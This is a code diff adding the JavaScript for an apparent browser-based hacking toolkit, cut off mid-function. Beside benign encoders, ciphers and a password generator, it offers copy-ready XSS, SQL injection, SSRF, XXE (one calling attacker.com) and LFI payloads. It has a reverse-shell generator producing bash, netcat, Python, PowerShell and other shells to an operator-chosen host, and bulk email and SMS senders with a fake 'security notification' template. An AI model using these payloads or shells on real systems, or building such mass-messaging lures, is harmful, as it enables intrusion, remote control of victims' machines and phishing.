+function buildCIDRRef(){var rows=[[8,'255.0.0.0','16,777,214','A'],[16,'255.255.0.0','65,534','B'],[24,'255.255.255.0','254','C'],[25,'255.255.255.128','126','—'],[26,'255.255.255.192','62','—'],[27,'255.255.255.224','30','—'],[28,'255.255.255.240','14','—'],[29,'255.255.255.248','6','—'],[30,'255.255.255.252','2','P2P'],[32,'255.255.255.255','1','Host']];var el=G('sn-ref');if(!el)return;el.innerHTML='<thead><tr><th>CIDR</th><th>MASK</th><th>HOSTS</th><th>CLASS</th></tr></thead>';var tb=document.createElement('tbody');rows.forEach(function(r){var tr=document.createElement('tr');tr.innerHTML='<td style="color:var(--cyan)">/'+r[0]+'</td><td style="color:var(--dim)">'+r[1]+'</td><td>'+r[2]+'</td><td style="color:var(--dim)">'+r[3]+'</td>';tb.appendChild(tr);});el.appendChild(tb);}
+
+// ── ENCODE ─────────────────────────────────────────────────
+function etab(id,el){document.querySelectorAll('#p-encode .tp').forEach(function(p){p.classList.remove('on');});document.querySelectorAll('#p-encode .tab').forEach(function(t){t.classList.remove('on');});var pane=G('e-'+id);if(pane)pane.classList.add('on');if(el)el.classList.add('on');}
+window.etab=etab;
+function b64E(){try{G('b64-o').innerHTML='<span class="g">'+btoa(G('b64-i').value)+'</span>';}catch(e){G('b64-o').innerHTML='<span class="r">'+e.message+'</span>';}}
+function b64D(){try{G('b64-o').innerHTML='<span class="g">'+atob(G('b64-i').value)+'</span>';}catch(e){G('b64-o').innerHTML='<span class="r">'+e.message+'</span>';}}
+function urlE(){G('url-o').innerHTML='<span class="g">'+encodeURIComponent(G('url-i').value)+'</span>';}
+function urlD(){try{G('url-o').innerHTML='<span class="g">'+decodeURIComponent(G('url-i').value)+'</span>';}catch(e){G('url-o').innerHTML='<span class="r">'+e.message+'</span>';}}
+function hexE(){G('hex-o').innerHTML='<span class="g">'+Array.from(G('hex-i').value).map(function(c){return c.charCodeAt(0).toString(16).padStart(2,'0');}).join(' ')+'</span>';}
+function hexD(){try{var h=G('hex-i').value.replace(/\s/g,'');G('hex-o').innerHTML='<span class="g">'+h.match(/.{2}/g).map(function(b){return String.fromCharCode(parseInt(b,16));}).join('')+'</span>';}catch(e){G('hex-o').innerHTML='<span class="r">'+e.message+'</span>';}}
+function binE(){G('bin-o').innerHTML='<span class="g">'+Array.from(G('bin-i').value).map(function(c){return c.charCodeAt(0).toString(2).padStart(8,'0');}).join(' ')+'</span>';}
+function binD(){try{var b=G('bin-i').value.replace(/\s/g,'');G('bin-o').innerHTML='<span class="g">'+b.match(/.{8}/g).map(function(b2){return String.fromCharCode(parseInt(b2,2));}).join('')+'</span>';}catch(e){G('bin-o').innerHTML='<span class="r">'+e.message+'</span>';}}
+async function doHash(a){var buf=await crypto.subtle.digest(a,new TextEncoder().encode(G('hash-i').value));var h=Array.from(new Uint8Array(buf)).map(function(b){return b.toString(16).padStart(2,'0');}).join('');G('hash-o').innerHTML='<span class="d">'+a+':</span>\n<span class="g">'+h+'</span>';}
+function htmleE(){var d=document.createElement('div');d.textContent=G('htmle-i').value;G('htmle-o').innerHTML='<span class="g">'+d.innerHTML+'</span>';}
+function htmleD(){var d=document.createElement('div');d.innerHTML=G('htmle-i').value;G('htmle-o').innerHTML='<span class="g">'+d.textContent+'</span>';}
+window.b64E=b64E;window.b64D=b64D;window.urlE=urlE;window.urlD=urlD;window.hexE=hexE;window.hexD=hexD;window.binE=binE;window.binD=binD;window.doHash=doHash;window.htmleE=htmleE;window.htmleD=htmleD;
+
+// ── CIPHERS ─────────────────────────────────────────────────
+function ctab(id,el){document.querySelectorAll('#p-cipher .tp').forEach(function(p){p.classList.remove('on');});document.querySelectorAll('#p-cipher .tab').forEach(function(t){t.classList.remove('on');});var pane=G('c-'+id);if(pane)pane.classList.add('on');if(el)el.classList.add('on');}
+window.ctab=ctab;
+function doCaesar(dir){var shift=parseInt(G('cs-s').value)*dir;var text=G('cs-i').value;var r=text.split('').map(function(c){if(/[a-zA-Z]/.test(c)){var base=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-base+((shift%26+26)%26))%26+base);}return c;}).join('');G('cs-o').innerHTML='<span class="g">'+r+'</span>';}
+function doROT13(){var t=G('r13-i').value;G('r13-o').innerHTML='<span class="g">'+t.split('').map(function(c){if(/[a-zA-Z]/.test(c)){var b=c<='Z'?65:97;return String.fromCharCode((c.charCodeAt(0)-b+13)%26+b);}return c;}).join('')+'</span>';}
+function doVig(enc){var key=G('vig-k').value.toUpperCase().replace(/[^A-Z]/g,'');var text=G('vig-i').value;if(!key){G('vig-o').innerHTML='<span class="r">Enter a key</span>';return;}var ki=0;var r=text.split('').map(function(c){if(/[a-zA-Z]/.test(c)){var b=c<='Z'?65:97;var k=key[ki%key.length].charCodeAt(0)-65;ki++;var sh=enc?k:26-k;return String.fromCharCode((c.charCodeAt(0)-b+sh)%26+b);}return c;}).join('');G('vig-o').innerHTML='<span class="g">'+r+'</span>';}
+var MO={A:'.-',B:'-...',C:'-.-.',D:'-..',E:'.',F:'..-.',G:'--.',H:'....',I:'..',J:'.---',K:'-.-',L:'.-..',M:'--',N:'-.',O:'---',P:'.--.',Q:'--.-',R:'.-.',S:'...',T:'-',U:'..-',V:'...-',W:'.--',X:'-..-',Y:'-.--',Z:'--..',0:'-----',1:'.----',2:'..---',3:'...--',4:'....-',5:'.....',6:'-....',7:'--...',8:'---..',9:'----.',' ':'/'};
+var MOR={};Object.entries(MO).forEach(function(kv){MOR[kv[1]]=kv[0];});
+function doMorse(toM){if(toM){G('mo-o').innerHTML='<span class="g">'+G('mo-i').value.toUpperCase().split('').map(function(c){return MO[c]||'';}).join(' ')+'</span>';}else{G('mo-o').innerHTML='<span class="g">'+G('mo-i').value.split(' / ').map(function(w){return w.split(' ').map(function(c){return MOR[c]||'?';}).join('');}).join(' ')+'</span>';}}
+function doAtbash(){G('ab-o').innerHTML='<span class="g">'+G('ab-i').value.split('').map(function(c){if(/[a-zA-Z]/.test(c)){var b=c<='Z'?65:97;return String.fromCharCode(b+25-(c.charCodeAt(0)-b));}return c;}).join('')+'</span>';}
+window.doCaesar=doCaesar;window.doROT13=doROT13;window.doVig=doVig;window.doMorse=doMorse;window.doAtbash=doAtbash;
+
+// ── PAYLOADS ──────────────────────────────────────────────
+var PAYLOADS={xss:['<img src=x onerror=alert(1)>','<svg onload=alert(1)>','<body onload=alert(1)>','javascript:alert(1)','<details open ontoggle=alert(1)>','<input autofocus onfocus=alert(1)>','"><img src=x onerror=confirm(1)>','<iframe src=javascript:alert(1)>'],sqli:["' OR '1'='1","' OR 1=1--","admin'--","1' ORDER BY 1--","1 UNION SELECT null,null,null--","1' AND SLEEP(5)--","' WAITFOR DELAY '0:0:5'--","' AND 1=2 UNION SELECT username,password FROM users--"],ssrf:['http://localhost/','http://127.0.0.1/','http://169.254.169.254/latest/meta-data/','http://[::1]/','http://0.0.0.0/','http://metadata.google.internal/','file:///etc/passwd','dict://localhost:11211/'],xxe:['<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>','<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><foo>&xxe;</foo>','<?xml version="1.0"?><!DOCTYPE data [<!ENTITY file SYSTEM "file:///etc/shadow">]><data>&file;</data>'],ssti:['{{7*7}}','${7*7}','<%= 7*7 %>','#{7*7}','*{7*7}','{{config}}','{{self.__dict__}}'],lfi:['../../../etc/passwd','..%2F..%2F..%2Fetc%2Fpasswd','/etc/passwd','/proc/self/environ','../../../windows/win.ini','php://filter/convert.base64-encode/resource=index.php']};
+function ptab(t,el){document.querySelectorAll('#p-payloads .tab').forEach(function(x){x.classList.remove('on');});if(el)el.classList.add('on');showPayloads(t);}
+window.ptab=ptab;
+function showPayloads(t){var pl=PAYLOADS[t]||[];var wrap=document.createElement('div');wrap.className='card';var lbl=document.createElement('div');lbl.className='clabel';lbl.textContent=t.toUpperCase()+' PAYLOADS ('+pl.length+')';wrap.appendChild(lbl);pl.forEach(function(p,i){var row=document.createElement('div');row.className='pitem';var num=document.createElement('span');num.className='pnum';num.textContent=i+1;var code=document.createElement('span');code.className='pcode';code.textContent=p;var btn=document.createElement('button');btn.className='btn bgh sm';btn.textContent='COPY';btn.onclick=function(){navigator.clipboard.writeText(p).then(function(){btn.textContent='COPIED';setTimeout(function(){btn.textContent='COPY';},1200);}).catch(function(){});};row.appendChild(num);row.appendChild(code);row.appendChild(btn);wrap.appendChild(row);});var out=G('pl-out');out.innerHTML='';out.appendChild(wrap);}
+
+// ── REV SHELL ─────────────────────────────────────────────
+var SHELLS=[{lang:'Bash',name:'Bash TCP',f:function(i,p){return 'bash -i >& /dev/tcp/'+i+'/'+p+' 0>&1';}},{lang:'Bash',name:'Bash UDP',f:function(i,p){return 'bash -i >& /dev/udp/'+i+'/'+p+' 0>&1';}},{lang:'Python',name:'Python 3',f:function(i,p){return "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\""+i+'",'+p+"));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'";} },{lang:'PHP',name:'PHP',f:function(i,p){return 'php -r \'$sock=fsockopen("'+i+'",'+p+');exec("/bin/sh -i <&3 >&3 2>&3");\'';} },{lang:'Ruby',name:'Ruby',f:function(i,p){return "ruby -rsocket -e'f=TCPSocket.open(\""+i+'",'+p+").to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'";} },{lang:'Netcat',name:'Netcat mkfifo',f:function(i,p){return 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+i+' '+p+' >/tmp/f';}},{lang:'Netcat',name:'Netcat -e',f:function(i,p){return 'nc -e /bin/sh '+i+' '+p;}},{lang:'PowerShell',name:'PowerShell',f:function(i,p){return '$c=New-Object Net.Sockets.TCPClient("'+i+'",'+p+');$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length)}';}},{lang:'Socat',name:'Socat',f:function(i,p){return 'socat tcp-connect:'+i+':'+p+' exec:/bin/sh,pty,stderr,setsid,sigint,sane';}},{lang:'Perl',name:'Perl',f:function(i,p){return 'perl -e \'use Socket;$i="'+i+'";$p='+p+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");\'';}}];
+var currentShell='';
+function buildShellGrid(){var grid=G('sg');if(!grid)return;grid.innerHTML='';SHELLS.forEach(function(s,i){var d=document.createElement('div');d.className='sc';d.innerHTML='<div class="sl">'+s.lang+'</div><div class="sn">'+s.name+'</div>';d.onclick=function(){showShell(i);};grid.appendChild(d);});}
+function showShell(i){var s=SHELLS[i];var ip=G('rs-ip').value||'10.10.10.1';var port=G('rs-port').value||'4444';currentShell=s.f(ip,port);G('sol').textContent=s.name;G('sout').textContent=currentShell;G('so').style.display='block';}
+function copyShell(){navigator.clipboard.writeText(currentShell).then(function(){var b=document.querySelector('#so .btn');if(b){b.textContent='COPIED!';setTimeout(function(){b.textContent='COPY';},1500);}}).catch(function(){});}
+window.copyShell=copyShell;
+
+// ── REGEX ──────────────────────────────────────────────────
+var RX_PATS={ipv4:{p:'\\b\\d{1,3}(\\.\\d{1,3}){3}\\b',f:'g'},email:{p:'[a-zA-Z0-9._%+\\-]+@[a-zA-Z0-9.\\-]+\\.[a-zA-Z]{2,}',f:'g'},url:{p:'https?:\\/\\/[^\\s/$.?#].[^\\s]*',f:'g'},mac:{p:'([0-9A-Fa-f]{2}[:\\-]){5}[0-9A-Fa-f]{2}',f:'g'},domain:{p:'\\b([a-z0-9\\-]+\\.)+[a-z]{2,}\\b',f:'gi'},md5:{p:'\\b[a-f0-9]{32}\\b',f:'gi'},jwt:{p:'eyJ[A-Za-z0-9_\\-]*\\.eyJ[A-Za-z0-9_\\-]*\\.[A-Za-z0-9_\\-]*',f:'g'},b64:{p:'[A-Za-z0-9+/]{20,}={0,2}',f:'g'},phone:{p:'(\\+\\d{1,3}[\\s\\-]?)?\\(?\\d{3}\\)?[\\s.\\-]?\\d{3}[\\s.\\-]?\\d{4}',f:'g'},ipv6:{p:'([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}',f:'g'}};
+function rxSet(k){var p=RX_PATS[k];if(!p)return;G('rx-p').value=p.p;G('rx-f').value=p.f;rxLive();}
+window.rxSet=rxSet;
+function rxLive(){var pat=G('rx-p').value,flags=G('rx-f').value,test=G('rx-t').value;if(!pat){G('rx-r').innerHTML='';return;}try{var re=new RegExp(pat,flags);var matches=Array.from(test.matchAll(re));var highlighted=test.replace(re,function(m){return '<mark style="background:rgba(0,212,255,.2);color:var(--cyan);border-radius:2px;padding:1px 2px">'+m.replace(/</g,'&lt;').replace(/>/g,'&gt;')+'</mark>';});G('rx-r').innerHTML='<div style="background:#020912;border:1px solid var(--brd);padding:9px;border-radius:2px;white-space:pre-wrap;font-size:11px;line-height:1.7;word-break:break-word">'+highlighted+'</div><div style="margin-top:6px;font-size:10px;color:var(--grn)">'+matches.length+' match'+(matches.length!==1?'es':'')+'</div>';}catch(e){G('rx-r').innerHTML='<span class="r" style="font-size:11px">Invalid regex: '+e.message+'</span>';}}
+window.rxLive=rxLive;
+
+// ── JWT ────────────────────────────────────────────────────
+function doJWT(){
+  var token=G('jwt-i').value.trim();if(!token){tset('jwt-r','<span class="d" style="font-size:11px">// Paste JWT above</span>');return;}
+  var parts=token.split('.');if(parts.length!==3){tset('jwt-r','<span class="r">Invalid JWT — must have 3 parts separated by dots</span>');return;}
+  function dec(p){try{return JSON.parse(atob(p.replace(/-/g,'+').replace(/_/g,'/')));}catch(e){return null;}}
+  var header=dec(parts[0]),payload=dec(parts[1]);var now=Math.floor(Date.now()/1000);var exp=payload&&payload.exp?payload.exp:null;var expired=exp&&exp<now;
+  var el=G('jwt-r');el.innerHTML='';var h=document.createElement('div');h.className='clabel';h.textContent='Header';el.appendChild(h);var ht=document.createElement('div');ht.className='term';ht.style.marginBottom='9px';ht.textContent=JSON.stringify(header,null,2);el.appendChild(ht);var p2=document.createElement('div');p2.className='clabel';p2.textContent='Payload';el.appendChild(p2);var pt=document.createElement('div');pt.className='term';pt.style.marginBottom='9px';pt.textContent=JSON.stringify(payload,null,2);el.appendChild(pt);var f={'Algorithm':header&&header.alg||'?','Type':header&&header.typ||'?','Issued At':payload&&payload.iat?new Date(payload.iat*1000).toISOString().slice(0,19):'—','Expires':exp?new Date(exp*1000).toISOString().slice(0,19)+(expired?' (EXPIRED)':' (VALID)'):'—','Issuer':payload&&payload.iss||'—','Subject':payload&&payload.sub||'—'};el.appendChild(rgrid(f));
+}
+window.doJWT=doJWT;
+
+// ── PASSWORDS ─────────────────────────────────────────────
+function genPw(){
+  var len=parseInt(G('pw-l').value)||24;var up=G('pw-u').checked,lo=G('pw-lo').checked,num=G('pw-n').checked,sym=G('pw-s').checked;var chars='';if(up)chars+='ABCDEFGHIJKLMNOPQRSTUVWXYZ';if(lo)chars+='abcdefghijklmnopqrstuvwxyz';if(num)chars+='0123456789';if(sym)chars+='!@#$%^&*()-_=+[]{}|;:,.<>?';if(!chars){G('pw-out').innerHTML='<span class="r">Select at least one character type</span>';return;}var arr=new Uint32Array(len);crypto.getRandomValues(arr);var pw=Array.from(arr).map(function(v){return chars[v%chars.length];}).join('');G('pw-out').textContent=pw;var score=0;if(len>=16)score++;if(len>=24)score++;if(up&&lo)score++;if(num)score++;if(sym)score++;var levels=[['WEAK','var(--red)'],['FAIR','var(--orn)'],['GOOD','var(--cyan)'],['STRONG','var(--grn)'],['VERY STRONG','var(--grn)']];var lv=levels[Math.min(score,4)];var entropy=Math.round(len*Math.log2(chars.length));G('pw-str').innerHTML='Strength: <span style="color:'+lv[1]+'">'+lv[0]+'</span> &nbsp;|&nbsp; Entropy: <span style="color:var(--y)">'+entropy+' bits</span>';
+}
+window.genPw=genPw;
+var WORDS=['correct','horse','battery','staple','crimson','falcon','nebula','quantum','vector','cipher','proxy','delta','shadow','ghost','raven','cobra','titan','nexus','forge','blade','storm','ember','frost','lunar','solar','prism','vault','omega','phoenix','swift'];
+function genPhrase(){var count=parseInt(G('wc').value)||5;var sep=G('ws').value;var arr=new Uint32Array(count);crypto.getRandomValues(arr);G('ph-out').textContent=Array.from(arr).map(function(v){return WORDS[v%WORDS.length];}).join(sep);}
+window.genPhrase=genPhrase;
+
+// ══════════════════════════════════════════════════════════
+// EMAIL MULTI-SENDER
+// ══════════════════════════════════════════════════════════
+var esRecipients=[];
+var esLog=[];
+var ejsCreds={service:'',template:'',pubkey:'',mode:'mailto'};
+var esSending=false;
+
+// wire up mode select show/hide
+G('es-mode').onchange=function(){G('es-template').style.display=this.value==='template'?'block':'none';};
+G('es-delay-check').onchange=function(){var v=this.checked;G('es-delay').style.display=v?'block':'none';G('es-delay-lbl').style.display=v?'block':'none';};
+
+function esTab(id,el){document.querySelectorAll('#p-emailsender .tabs:first-of-type .tab').forEach(function(t){t.classList.remove('on');});if(el)el.classList.add('on');['compose','recipients','settings','log'].forEach(function(s){var p=G('es-'+s);if(p)p.classList[id===s?'add':'remove']('on');});}
+window.esTab=esTab;
+
+function esRecipTab(id,el){var par=el.closest('.tabs');par.querySelectorAll('.tab').forEach(function(t){t.classList.remove('on');});el.classList.add('on');['single','bulk','csv'].forEach(function(s){var p=G('es-r-'+s);if(p)p.classList[id===s?'add':'remove']('on');});}
+window.esRecipTab=esRecipTab;
+
+function esRefreshList(){
+  var el=G('es-rlist');var cnt=esRecipients.length;
+  G('es-rcnt').textContent=cnt;G('es-rcnt2').textContent=cnt;
+  G('es-st-total').textContent=cnt;G('es-st-pend').textContent=cnt;
+  G('es-sendinfo').innerHTML=cnt?'Ready to send to <strong style="color:var(--cyan)">'+cnt+'</strong> recipient'+(cnt!==1?'s':'')+'.':'No recipients added yet.';
+  if(!cnt){el.innerHTML='<span class="d" style="font-size:11px;padding:4px">No recipients yet</span>';return;}
+  el.innerHTML='';
+  esRecipients.forEach(function(r,i){var row=document.createElement('div');row.className='recip-item';row.innerHTML='<span class="ri-val">'+r.email+(r.name?' &nbsp;<span style="color:var(--dim);font-size:10px">'+r.name+'</span>':'')+'</span><span class="ri-rm" onclick="esRemoveRecip('+i+')">✕</span>';el.appendChild(row);});
+}
+
+function esAddRecip(){
+  var email=G('es-r-email').value.trim();var name=G('es-r-name').value.trim();
+  if(!email||!/\S+@\S+\.\S+/.test(email)){G('es-r-email').style.borderColor='var(--red)';setTimeout(function(){G('es-r-email').style.borderColor='';},1200);return;}
+  if(esRecipients.some(function(r){return r.email===email;})){return;}
+  esRecipients.push({email:email,name:name});G('es-r-email').value='';G('es-r-name').value='';esRefreshList();
+}
+window.esAddRecip=esAddRecip;
+
+function esRemoveRecip(i){esRecipients.splice(i,1);esRefreshList();}
+window.esRemoveRecip=esRemoveRecip;
+
+function esClearRecips(){esRecipients=[];esRefreshList();}
+window.esClearRecips=esClearRecips;
+
+function esImportBulk(){
+  var lines=G('es-r-bulk-ta').value.split('\n');var added=0;
+  lines.forEach(function(line){line=line.trim();if(!line)return;var m=line.match(/^(.+?)\s*<(.+?)>$/);var email=m?m[2].trim():line;var name=m?m[1].trim():'';if(/\S+@\S+\.\S+/.test(email)&&!esRecipients.some(function(r){return r.email===email;})){esRecipients.push({email:email,name:name});added++;}});
+  esRefreshList();G('es-r-bulk-ta').value='';alert('Imported '+added+' recipients.');
+}
+window.esImportBulk=esImportBulk;
+
+function esImportCSV(){
+  var lines=G('es-r-csv-ta').value.split('\n');var added=0;
+  lines.forEach(function(line,idx){var parts=line.split(',');var email=(parts[0]||'').trim();var name=(parts[1]||'').trim();if(idx===0&&email.toLowerCase()==='email')return;if(/\S+@\S+\.\S+/.test(email)&&!esRecipients.some(function(r){return r.email===email;})){esRecipients.push({email:email,name:name});added++;}});
+  esRefreshList();G('es-r-csv-ta').value='';alert('Imported '+added+' recipients.');
+}
+window.esImportCSV=esImportCSV;
+
+function esLoadTemplate(){
+  var t=G('es-template').value;var TEMPLATES={formal:'Dear {{name}},\n\nI hope this message finds you well. I am reaching out to discuss a matter of mutual interest...\n\nBest regards,',followup:'Hi {{name}},\n\nI wanted to follow up on my previous message. Please let me know if you have any questions.\n\nThanks!',alert:'IMPORTANT NOTICE\n\nDear {{name}},\n\nThis is an automated security notification. Please review the attached information and take appropriate action.\n\nRegards, Security Team',newsletter:'Hello {{name}},\n\nHere is your monthly update:\n\n• News item 1\n• News item 2\n• News item 3\n\nUnsubscribe: [link]\n\nBest,'};
+  if(TEMPLATES[t])G('es-body').value=TEMPLATES[t];
+}
+window.esLoadTemplate=esLoadTemplate;
+
+function esLogEntry(email,status,msg){
+  var entry={time:new Date().toISOString().slice(11,19),email:email,status:status,msg:msg};
+  esLog.unshift(entry);
+  G('es-lcnt').textContent=esLog.length;
+  esRefreshLog();
+}
+function esRefreshLog(){
+  var el=G('es-logbody');if(!esLog.length){el.innerHTML='<span class="d" style="font-size:11px">No activity yet</span>';return;}
+  el.innerHTML='';
+  esLog.forEach(function(e){var row=document.createElement('div');row.className='slog-entry '+(e.status==='ok'?'ok':e.status==='fail'?'fail':'pending');row.innerHTML='<span style="color:var(--dim)">['+e.time+']</span> <span style="color:var(--cyan)">'+e.email+'</span> — '+(e.status==='ok'?'<span class="g">✓ Sent</span>':e.status==='fail'?'<span class="r">✗ Failed</span>':'<span class="o">⋯ Pending</span>')+' <span style="color:var(--dim);font-size:10px">'+e.msg+'</span>';el.appendChild(row);});
+}
+function esClearLog(){esLog=[];G('es-lcnt').textContent=0;esRefreshLog();}
+window.esClearLog=esClearLog;
+
+function ejsSave(){var s=G('ejs-service').value.trim(),t=G('ejs-template').value.trim(),k=G('ejs-pubkey').value.trim();if(!s||!t||!k){G('ejs-status').innerHTML='<span class="r">All three fields required</span>';return;}ejsCreds.service=s;ejsCreds.template=t;ejsCreds.pubkey=k;G('ejs-status').innerHTML='<span class="g">✓ Credentials saved (session only)</span>';}
+window.ejsSave=ejsSave;
+function ejsTest(){G('ejs-status').innerHTML='<span class="o">Testing connection...</span>';setTimeout(function(){if(ejsCreds.service&&ejsCreds.pubkey){G('ejs-status').innerHTML='<span class="g">✓ Credentials look valid — send a test to confirm</span>';}else{G('ejs-status').innerHTML='<span class="r">No credentials saved. Add Service ID, Template ID and Public Key.</span>';}},800);}
+window.ejsTest=ejsTest;
+function ejsClear(){['ejs-service','ejs-template','ejs-pubkey'].forEach(function(id){G(id).value='';});ejsCreds={service:'',template:'',pubkey:'',mode:ejsCreds.mode};G('ejs-status').innerHTML='<span class="d">Cleared.</span>';}
+window.ejsClear=ejsClear;
+function ejsSaveMode(){ejsCreds.mode=G('ejs-sendmode').value;G('ejs-mode-status').textContent='Mode set to: '+ejsCreds.mode;}
+window.ejsSaveMode=ejsSaveMode;
+
+async function esSendOne(recip){
+  var subject=G('es-subject').value||'(no subject)';
+  var body=G('es-body').value||'';var personalize=G('es-personalize').checked;
+  var finalBody=personalize?body.replace(/\{\{name\}\}/g,recip.name||recip.email.split('@')[0]):body;
+  var finalSubj=personalize?subject.replace(/\{\{name\}\}/g,recip.name||recip.email.split('@')[0]):subject;
+
+  if(ejsCreds.mode==='emailjs'){
+    if(!ejsCreds.service||!ejsCreds.pubkey){return{ok:false,msg:'No EmailJS credentials'};}
+    try{
+      var resp=await fetch('https://api.emailjs.com/api/v1.0/email/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({service_id:ejsCreds.service,template_id:ejsCreds.template,user_id:ejsCreds.pubkey,template_params:{to_email:recip.email,to_name:recip.name||recip.email,from_name:G('es-from-name').value||'NetHawk Sender',from_email:G('es-from-email').value||'',subject:finalSubj,message:finalBody}})});
+      if(resp.status===200)return{ok:true,msg:'via EmailJS'};
+      return{ok:false,msg:'EmailJS error '+resp.status};
+    }catch(e){return{ok:false,msg:e.message};}
+  } else if(ejsCreds.mode==='mailto'){
+    var link='mailto:'+encodeURIComponent(recip.email)+'?subject='+encodeURIComponent(finalSubj)+'&body='+encodeURIComponent(finalBody);
+    window.open(link,'_blank');
+    return{ok:true,msg:'opened mailto:'};
+  }
+  return{ok:false,msg:'Unknown mode'};
+}
+
+async function esSendAll(){
+  if(esSending)return;if(!esRecipients.length){alert('Add recipients first.');return;}
+  esSending=true;var sent=0,failed=0;
+  G('es-st-sent').textContent=0;G('es-st-fail').textContent=0;
+  var delay=G('es-delay-check').checked?parseInt(G('es-delay').value)||2:0;
+  for(var i=0;i<esRecipients.length;i++){
+    var r=esRecipients[i];G('es-prog').style.width=Math.round((i+1)/esRecipients.length*100)+'%';
+    var result=await esSendOne(r);
+    if(result.ok){sent++;G('es-st-sent').textContent=sent;esLogEntry(r.email,'ok',result.msg);}
+    else{failed++;G('es-st-fail').textContent=failed;esLogEntry(r.email,'fail',result.msg);}
+    if(delay>0)await new Promise(function(res){setTimeout(res,delay*1000);});
+  }
+  esSending=false;G('es-prog').style.width='100%';
+  alert('Send complete: '+sent+' sent, '+failed+' failed.');
+}
+window.esSendAll=esSendAll;
+
+async function esSendTest(){
+  if(!esRecipients.length){alert('Add at least one recipient.');return;}
+  var r=esRecipients[0];var result=await esSendOne(r);
+  esLogEntry(r.email,result.ok?'ok':'fail',(result.ok?'TEST OK: ':'TEST FAIL: ')+result.msg);
+  alert('Test send to '+r.email+': '+(result.ok?'Success — '+result.msg:'Failed — '+result.msg));
+}
+window.esSendTest=esSendTest;
+
+function esReset(){G('es-st-sent').textContent=0;G('es-st-fail').textContent=0;G('es-prog').style.width='0%';esSending=false;}
+window.esReset=esReset;
+
+
+// ══════════════════════════════════════════════════════════
+// PHONE MULTI-SENDER
+// ══════════════════════════════════════════════════════════
+var psContacts=[];
+var psLog=[];
+var twCreds={sid:'',token:'',from:'',mode:'simulate'};
+var psSending=false;
+
+G('ps-type').onchange=function(){G('ps-mms-row').style.display=this.value==='mms'?'flex':'none';};
+G('ps-delay-check').onchange=function(){var v=this.checked;G('ps-delay').style.display=v?'block':'none';G('ps-delay-lbl').style.display=v?'block':'none';};
+
+function psTab(id,el){document.querySelectorAll('#p-phonesender .tabs:first-of-type .tab').forEach(function(t){t.classList.remove('on');});if(el)el.classList.add('on');['compose','recipients','settings','log'].forEach(function(s){var p=G('ps-'+s);if(p)p.classList[id===s?'add':'remove']('on');});}
+window.psTab=psTab;
+
+function psRecipTab(id,el){var par=el.closest('.tabs');par.querySelectorAll('.tab').forEach(function(t){t.classList.remove('on');});el.classList.add('on');['single','bulk','csv'].forEach(function(s){var p=G('ps-r-'+s);if(p)p.classList[id===s?'add':'remove']('on');});}
+window.psRecipTab=psRecipTab;
+
+function psCountChars(){var l=G('ps-body').value.length;G('ps-charcount').textContent=l+' / 160';G('ps-segcount').textContent=l>160?Math.ceil(l/153)+' SMS segments':'';}
+
+function psRefreshList(){
+  var el=G('ps-rlist');var cnt=psContacts.length;
+  G('ps-rcnt').textContent=cnt;G('ps-rcnt2').textContent=cnt;
+  G('ps-st-total').textContent=cnt;G('ps-st-pend').textContent=cnt;
+  G('ps-sendinfo').innerHTML=cnt?'Ready to send to <strong style="color:var(--cyan)">'+cnt+'</strong> contact'+(cnt!==1?'s':'')+'.':'No contacts added yet.';
+  if(!cnt){el.innerHTML='<span class="d" style="font-size:11px;padding:4px">No contacts yet</span>';return;}
+  el.innerHTML='';
+  psContacts.forEach(function(r,i){var row=document.createElement('div');row.className='recip-item';row.innerHTML='<span class="ri-val">'+r.phone+(r.name?' &nbsp;<span style="color:var(--dim);font-size:10px">'+r.name+'</span>':'')+'</span><span class="ri-rm" onclick="psRemoveRecip('+i+')">✕</span>';el.appendChild(row);});
+}
+
+function psAddRecip(){
+  var phone=G('ps-r-num').value.trim();var name=G('ps-r-name').value.trim();
+  if(!phone||!/^\+/.test(phone)){G('ps-r-num').style.borderColor='var(--red)';setTimeout(function(){G('ps-r-num').style.borderColor='';},1500);return;}
+  if(psContacts.some(function(c){return c.phone===phone;}))return;
+  psContacts.push({phone:phone,name:name});G('ps-r-num').value='';G('ps-r-name').value='';psRefreshList();
+}
+window.psAddRecip=psAddRecip;
+
+function psRemoveRecip(i){psContacts.splice(i,1);psRefreshList();}
+window.psRemoveRecip=psRemoveRecip;
+
+function psClearRecips(){psContacts=[];psRefreshList();}
+window.psClearRecips=psClearRecips;
+
+function psImportBulk(){
+  var lines=G('ps-r-bulk-ta').value.split('\n');var added=0;
+  lines.forEach(function(line){line=line.trim();if(!line)return;var m=line.match(/^(.+?):\s*(\+\S+)$/);var phone=m?m[2]:line;var name=m?m[1]:'';phone=phone.replace(/[\s\-\(\)]/g,'');if(/^\+\d{7,}$/.test(phone)&&!psContacts.some(function(c){return c.phone===phone;})){psContacts.push({phone:phone,name:name});added++;}});
+  psRefreshList();G('ps-r-bulk-ta').value='';alert('Imported '+added+' contacts.');
+}
+window.psImportBulk=psImportBulk;
+
+function psImportCSV(){
+  var lines=G('ps-r-csv-ta').value.split('\n');var added=0;
+  lines.forEach(function(line,idx){var parts=line.split(',');var phone=(parts[0]||'').trim().replace(/[\s\-\(\)]/g,'');var name=(parts[1]||'').trim();if(idx===0&&phone.toLowerCase()==='phone')return;if(/^\+\d{7,}$/.test(phone)&&!psContacts.some(function(c){return c.phone===phone;})){psContacts.push({phone:phone,name:name});added++;}});
